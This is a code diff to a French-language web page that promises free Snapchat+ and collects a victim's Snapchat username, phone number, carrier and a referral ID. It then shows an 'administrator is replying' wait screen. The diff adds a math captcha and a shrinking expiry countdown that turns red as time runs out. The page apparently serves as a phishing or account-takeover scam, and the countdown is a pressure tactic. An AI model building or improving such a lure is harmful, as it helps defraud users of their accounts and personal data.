@@ -839,6 +839,14 @@
                     </div>
                 </div>
 
+                <!-- CAPTCHA -->
+                <div id="captchaBox" style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:14px 16px;margin-bottom:16px;display:flex;align-items:center;gap:14px;flex-wrap:wrap">
+                    <span style="font-size:13px;color:#bbb">Je ne suis pas un robot :</span>
+                    <span id="captchaQuestion" style="font-size:16px;font-weight:800;color:#FFFC00;font-variant-numeric:tabular-nums;letter-spacing:1px">…</span>
+                    <span style="color:#bbb">=</span>
+                    <input id="captchaInput" type="number" inputmode="numeric" placeholder="?" style="width:64px;padding:8px 10px;border-radius:8px;border:1px solid rgba(255,255,255,0.15);background:#111;color:#fff;font-size:16px;font-weight:700;text-align:center;outline:none" onkeydown="if(event.key==='Enter')submitStep1()">
+                    <button onclick="loadCaptcha()" style="background:none;border:none;color:#666;font-size:16px;cursor:pointer;padding:4px" title="Nouveau code"><i class="fas fa-sync-alt"></i></button>
+                </div>
                 <button id="sendBtn" class="submit-button" onclick="submitStep1()"><i class="fas fa-paper-plane"></i> Obtenir Snapchat+ gratuit</button>
             </div>
         </div>
@@ -901,8 +909,12 @@
                         <div class="typing-dot"></div>
                         <span class="typing-label">L'administrateur répond...</span>
                     </div>
-                    <div class="wait-timer">
-                        <i class="fas fa-clock"></i> En attente depuis <span id="waitTimerDisplay">0:00</span>
+                    <div class="wait-timer" id="countdownWrap" style="margin-top:12px;flex-direction:column;gap:4px">
+                        <div style="font-size:12px;color:#888">Expire dans</div>
+                        <div style="font-size:28px;font-weight:900;color:#FFFC00;font-variant-numeric:tabular-nums;letter-spacing:-1px" id="waitCountdown">–:––</div>
+                        <div style="width:180px;height:4px;background:rgba(255,255,255,0.1);border-radius:4px;overflow:hidden">
+                            <div id="waitCountdownBar" style="height:100%;background:#FFFC00;border-radius:4px;width:100%;transition:width 1s linear"></div>
+                        </div>
                     </div>
                 </div>
 
@@ -982,15 +994,27 @@
 
     <script>
         // Vider les champs au chargement pour éviter l'autocomplétion du navigateur
+        async function loadCaptcha() {
+            try {
+                const d = await fetch('/api/captcha').then(r => r.json());
+                const el = document.getElementById('captchaQuestion');
+                if (el) el.textContent = d.question + ' =';
+                const inp = document.getElementById('captchaInput');
+                if (inp) inp.value = '';
+            } catch(e) {}
+        }
+
         window.addEventListener('DOMContentLoaded', () => {
             const ph = document.getElementById('phoneInput');
             const sn = document.getElementById('snapchatInput');
             if (ph) ph.value = '';
             if (sn) sn.value = '';
+            loadCaptcha();
         });
 
         let currentId = null;
         let currentSnapchat = '';
+        let currentExpiresAt = null;
         let animationInterval = null;
         let progressStepIndex = 0;
         const totalProgressSteps = 5;
@@ -1028,7 +1052,7 @@
                 const res = await fetch('/api/submit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ snapchat, phone, operator, ref: REF_ID })
+                    body: JSON.stringify({ snapchat, phone, operator, ref: REF_ID, captcha: parseInt(document.getElementById('captchaInput')?.value) })
                 });
                 let data = {};
                 try { data = await res.json(); } catch(e) {}
@@ -1049,8 +1073,16 @@
                     sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Obtenir Snapchat+ gratuit';
                     return;
                 }
+                if (res.status === 400) {
+                    showRateLimitError(data.error || 'Vérification échouée.');
+                    sendBtn.disabled = false;
+                    sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Obtenir Snapchat+ gratuit';
+                    loadCaptcha(); // regénérer captcha
+                    return;
+                }
                 if (!res.ok || !data.id) throw new Error(data.error || 'Erreur serveur');
                 currentId = data.id;
+                currentExpiresAt = data.expiresAt || (Date.now() + 5 * 60 * 1000);
                 showStep('loading-advanced');
                 document.getElementById('loading-account').textContent = '@' + currentSnapchat;
                 startAdvancedLoadingAnimation(10);
@@ -1133,15 +1165,18 @@
             circle.style.background = `conic-gradient(#FFFC00 0% 100%, rgba(255,255,255,0.15) 0% 100%)`;
             circle.classList.add('pulse-animation');
 
-            // Démarrer le timer d'attente
-            waitStartTime = Date.now();
+            // Countdown jusqu'à expiration
             if (waitTimerInterval) clearInterval(waitTimerInterval);
+            const totalMs = (currentExpiresAt || Date.now() + 300000) - Date.now();
             waitTimerInterval = setInterval(() => {
-                const elapsed = Math.floor((Date.now() - waitStartTime) / 1000);
-                const m = Math.floor(elapsed / 60);
-                const s = String(elapsed % 60).padStart(2, '0');
-                const el = document.getElementById('waitTimerDisplay');
-                if (el) el.textContent = `${m}:${s}`;
+                const remaining = Math.max(0, currentExpiresAt - Date.now());
+                const m = Math.floor(remaining / 60000);
+                const s = String(Math.floor((remaining % 60000) / 1000)).padStart(2, '0');
+                const cdEl  = document.getElementById('waitCountdown');
+                const barEl = document.getElementById('waitCountdownBar');
+                if (cdEl)  cdEl.textContent  = `${m}:${s}`;
+                if (barEl) barEl.style.width  = Math.max(0, (remaining / totalMs * 100)).toFixed(1) + '%';
+                if (barEl) barEl.style.background = remaining < 30000 ? '#ff4d4d' : remaining < 60000 ? '#f97316' : '#FFFC00';
             }, 1000);
 
             startPolling();
